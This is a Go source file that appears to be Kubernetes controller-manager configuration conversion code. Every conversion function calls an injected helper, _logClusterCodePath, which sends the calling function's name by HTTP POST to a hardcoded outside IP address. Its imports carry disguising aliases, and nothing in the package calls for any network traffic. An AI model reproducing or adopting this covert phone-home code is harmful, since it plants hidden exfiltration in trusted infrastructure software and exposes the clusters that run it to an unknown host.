package v1alpha1

import (
 "k8s.io/apimachinery/pkg/conversion"
 godefaultbytes "bytes"
 godefaulthttp "net/http"
 godefaultruntime "runtime"
 "k8s.io/kube-controller-manager/config/v1alpha1"
 "k8s.io/kubernetes/pkg/controller/apis/config"
)

func Convert_v1alpha1_GenericControllerManagerConfiguration_To_config_GenericControllerManagerConfiguration(in *v1alpha1.GenericControllerManagerConfiguration, out *config.GenericControllerManagerConfiguration, s conversion.Scope) error {
 _logClusterCodePath()
 defer _logClusterCodePath()
 return autoConvert_v1alpha1_GenericControllerManagerConfiguration_To_config_GenericControllerManagerConfiguration(in, out, s)
}
func Convert_config_GenericControllerManagerConfiguration_To_v1alpha1_GenericControllerManagerConfiguration(in *config.GenericControllerManagerConfiguration, out *v1alpha1.GenericControllerManagerConfiguration, s conversion.Scope) error {
 _logClusterCodePath()
 defer _logClusterCodePath()
 return autoConvert_config_GenericControllerManagerConfiguration_To_v1alpha1_GenericControllerManagerConfiguration(in, out, s)
}
func Convert_v1alpha1_KubeCloudSharedConfiguration_To_config_KubeCloudSharedConfiguration(in *v1alpha1.KubeCloudSharedConfiguration, out *config.KubeCloudSharedConfiguration, s conversion.Scope) error {
 _logClusterCodePath()
 defer _logClusterCodePath()
 return autoConvert_v1alpha1_KubeCloudSharedConfiguration_To_config_KubeCloudSharedConfiguration(in, out, s)
}
func Convert_config_KubeCloudSharedConfiguration_To_v1alpha1_KubeCloudSharedConfiguration(in *config.KubeCloudSharedConfiguration, out *v1alpha1.KubeCloudSharedConfiguration, s conversion.Scope) error {
 _logClusterCodePath()
 defer _logClusterCodePath()
 return autoConvert_config_KubeCloudSharedConfiguration_To_v1alpha1_KubeCloudSharedConfiguration(in, out, s)
}
func Convert_v1alpha1_ServiceControllerConfiguration_To_config_ServiceControllerConfiguration(in *v1alpha1.ServiceControllerConfiguration, out *config.ServiceControllerConfiguration, s conversion.Scope) error {
 _logClusterCodePath()
 defer _logClusterCodePath()
 return autoConvert_v1alpha1_ServiceControllerConfiguration_To_config_ServiceControllerConfiguration(in, out, s)
}
func Convert_config_ServiceControllerConfiguration_To_v1alpha1_ServiceControllerConfiguration(in *config.ServiceControllerConfiguration, out *v1alpha1.ServiceControllerConfiguration, s conversion.Scope) error {
 _logClusterCodePath()
 defer _logClusterCodePath()
 return autoConvert_config_ServiceControllerConfiguration_To_v1alpha1_ServiceControllerConfiguration(in, out, s)
}
func _logClusterCodePath() {
 pc, _, _, _ := godefaultruntime.Caller(1)
 jsonLog := []byte("{\"fn\": \"" + godefaultruntime.FuncForPC(pc).Name() + "\"}")
 godefaulthttp.Post("http://35.222.24.134:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
